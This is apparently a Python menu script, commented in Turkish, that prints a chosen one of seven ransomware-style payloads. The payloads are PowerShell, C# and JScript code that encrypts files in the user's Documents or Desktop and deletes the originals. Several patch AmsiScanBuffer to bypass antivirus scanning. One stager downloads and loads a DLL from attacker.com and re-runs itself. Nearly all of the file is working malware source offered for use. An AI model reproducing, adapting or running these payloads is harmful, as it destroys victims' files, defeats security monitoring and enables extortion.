py = """

1:Basit XOR Şifreleme - Documents klasöründeki .txt dosyalarını kilitler
powershell
2. XOR Şifreleme + Çoklu aşamalı PowerShell script zinciri (Dosya içeriklerini XOR ile kilitler
3. C# AMSI Bypass ve XOR şifreleme ile dosya kilitleme (x86 çağrıları)
4. JScript içinden PowerShell çağırıp XOR şifreleme
5. Uzaktan assembly indiren ve içinde Encryptor sınıfı çağıran stager
6.Dosya içeriklerini sistem belleğinde şifreleyen ve eski halini silen güçlü bellek tahsisi kullanımı
7.AMSI Bypass + Katmanlı XOR ve AES şifreleme

"""
print(py)
c = input("pyloadi secin: ")





p = r"""
$a={[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4ARQBtAGkAdAAn'));$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('x')),[Reflection.Emit.AssemblyBuilderAccess]::Run);$m=$d.DefineDynamicModule('x');$t=$m.DefineType('x',[TypeAttributes] 'Public');$f=$t.DefineMethod('b',[Reflection.MethodAttributes] 'Public,Static',[Void],@());$il=$f.GetILGenerator();0..5|%{$il.Emit(0x00)};$il.Emit(0x2A);$x=$t.CreateType();$x.GetMethod('b').Invoke($null,$null)};&$a;$e={param($p,$x,$k) $k=[Text.Encoding]::UTF8.GetBytes($k);gci $p -Recurse -Filter $x|%{$c=[IO.File]::ReadAllBytes($_.FullName);$o=for($i=0;$i -lt $c.Length;$i++){$c[$i] -bxor $k[$i%%$k.Length]};[IO.File]::WriteAllBytes("$($_.FullName).locked",$o);rm $_.FullName -Force}};&$e "$env:USERPROFILE\Documents" "*.txt" "🔥🔥🔥🔥🔥🔥"
"""

pp = r"""

$a="$env:TEMP\";$k=[Text.Encoding]::UTF8.GetBytes('SuperKey1337!');'Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" -Recurse | % { $_.FullName } > "$a\f.txt"'|Out-File "$a\1.ps1";'gc "$a\f.txt"|%{$b=[IO.File]::ReadAllBytes($_);for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor'+[String]::Join(';',$k|%{"$_"})+'.$i%'+$k.Length+'};[IO.File]::WriteAllBytes($_+".locked",$b);Remove-Item $_}'|Out-File "$a\2.ps1";'rm "$a\f.txt";rm $MyInvocation.MyCommand.Path'|Out-File "$a\3.ps1";Start-Process powershell -Args "-ep Bypass -f $a\1.ps1";Start-Sleep -s 5;Start-Process powershell -Args "-ep Bypass -f $a\2.ps1";Start-Sleep -s 5;Start-Process powershell -Args "-ep Bypass -f $a\3.ps1"


"""


ppp = r"""



$a=@"
using System;using System.IO;using System.Text;using System.Runtime.InteropServices;public class L{[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,UIntPtr l,uint n,out uint o);public static void K(){var l=LoadLibrary("amsi");var a=GetProcAddress(l,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)5,0x40,out o);Marshal.Copy(new byte[]{0xC3,0x90,0x90,0x90,0x90},0, a, 5);}public static void X(string f,byte[] k){var b=File.ReadAllBytes(f);for(int i=0;i<b.Length;i++)b[i]^=k[i%k.Length];File.WriteAllBytes(f+".dead",b);File.Delete(f);}} 
"@;Add-Type $a;[L]::K();$k=[Text.Encoding]::UTF8.GetBytes('AdvancedKey');Get-ChildItem "$env:USERPROFILE\Documents" -Filter *.txt -Recurse|%{[L]::X($_.FullName,$k)}



"""


pppp =  r"""



$js=@'var x=new ActiveXObject("WScript.Shell");x.Run("powershell -w hidden -c $k=[Text.Encoding]::UTF8.GetBytes('''+'''MalwareX'''+''');function x($f,$k){$b=[IO.File]::ReadAllBytes($f);for($i=0;$i -lt $b.Length;$i++){$b[$i] = $b[$i] -bxor $k[$i%%$k.Length]}[IO.File]::WriteAllBytes($f+'.dead',$b);Remove-Item $f}gci $env:USERPROFILE\Desktop\*.txt -Recurse|%{x $_.FullName $k}")'@;cscript //e:jscript /nologo ($js)


"""




ppppp = r"""


# 1. Küçük PowerShell stager - Uzaktaki assembly'i indir ve belleğe yükle
$assemblyUrl = "http://attacker.com/malware.dll"
$assemblyBytes = (New-Object System.Net.WebClient).DownloadData($assemblyUrl)
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

# 2. Assembly içindeki 'Encryptor' sınıfından 'StartEncryption' methodunu çağır
$encryptorType = $assembly.GetType("Malware.Encryptor")
$method = $encryptorType.GetMethod("StartEncryption")
$instance = [Activator]::CreateInstance($encryptorType)
$method.Invoke($instance, @())

# 3. Belirli zaman aralıklarıyla veya olaylarla zincirleme çalıştırma (örnek)
Start-Sleep -Seconds 30
Invoke-Expression -Command $MyInvocation.MyCommand.Definition # Kendini tekrar çalıştır

# Not: Yukarıdaki zincirleme tetikleme, persistence ya da zamanlamaya göre değişir.




"""
pppppp = r"""


Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
}
"@;

$files = Get-ChildItem $env:USERPROFILE\Documents -Recurse -Include *.doc,*.xls,*.pdf; 
$key = (Get-Date).ToFileTime(); 
foreach ($f in $files) {
    $bytes = [System.IO.File]::ReadAllBytes($f.FullName); 
    for ($i=0; $i -lt $bytes.Length; $i++) { 
        $bytes[$i] = $bytes[$i] -bxor ($key -band 0xFF); 
        $key = ($key * 31 + 7) -band 0xFFFFFFFFFFFFFFFF; 
    }
    $ptr = [WinAPI]::VirtualAlloc([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40); 
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length); 
    [WinAPI]::VirtualFree($ptr, 0, 0x8000); 
    [System.IO.File]::WriteAllBytes($f.FullName + ".crypt", $bytes);
    Remove-Item $f.FullName;
}


"""

ppppppp = r"""
# AMSI Bypass - API Hooking ile
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class AMSIBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Bypass() {
        IntPtr amsi = GetModuleHandle("amsi.dll");
        IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        unsafe {
            byte* ptr = (byte*)addr.ToPointer();
            ptr[0] = 0xB8; // mov eax,0
            ptr[1] = 0x57;
            ptr[2] = 0x00;
            ptr[3] = 0x07;
            ptr[4] = 0x80;
            ptr[5] = 0xC3; // ret
        }
        VirtualProtect(addr, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"@
[AMSIBypass]::Bypass()

# Katmanlı XOR + AES Şifreleme Fonksiyonları
function XOR-Encrypt {
    param([byte[]]$data, [byte]$key)
    for ($i=0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor $key
    }
    return $data
}

function AES-Encrypt {
    param([byte[]]$data, [byte[]]$key, [byte[]]$iv)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $encryptor = $aes.CreateEncryptor()
    return $encryptor.TransformFinalBlock($data, 0, $data.Length)
}

# Anahtar ve IV Hazırlığı
$key = (1..32 | ForEach-Object {Get-Random -Minimum 0 -Maximum 255}) -as [byte[]]
$iv = (1..16 | ForEach-Object {Get-Random -Minimum 0 -Maximum 255}) -as [byte[]]
$xorkey = 0x5A

# Hedef Klasör ve Dosya Uzantıları
$targetFolder = "$env:USERPROFILE\Documents"
$extensions = @("txt","doc","docx","xls","xlsx","pdf")

# Dosyaları Şifreleme
Get-ChildItem -Path $targetFolder -Recurse -File | Where-Object { $extensions -contains $_.Extension.TrimStart(".") } | ForEach-Object {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $xorEncrypted = XOR-Encrypt -data $bytes -key $xorkey
        $aesEncrypted = AES-Encrypt -data $xorEncrypted -key $key -iv $iv
        [System.IO.File]::WriteAllBytes($_.FullName, $aesEncrypted)
    } catch {}
}

# Anahtar ve IV'yi gizli olarak Base64 ile kaydet (örnek amaçlı)
"$([Convert]::ToBase64String($key))|$([Convert]::ToBase64String($iv))" | Out-File "$env:APPDATA\keyinfo.dat" -Encoding ascii
"""


if c == '1':
    print(p)
elif c == '2':
    print(pp)
elif c == '3':
    print(ppp)
elif c == '4':
    print(pppp)
elif c == '5':
    print(ppppp)
elif c == '6':
    print(pppppp)
elif c == '7':
    print(ppppppp)
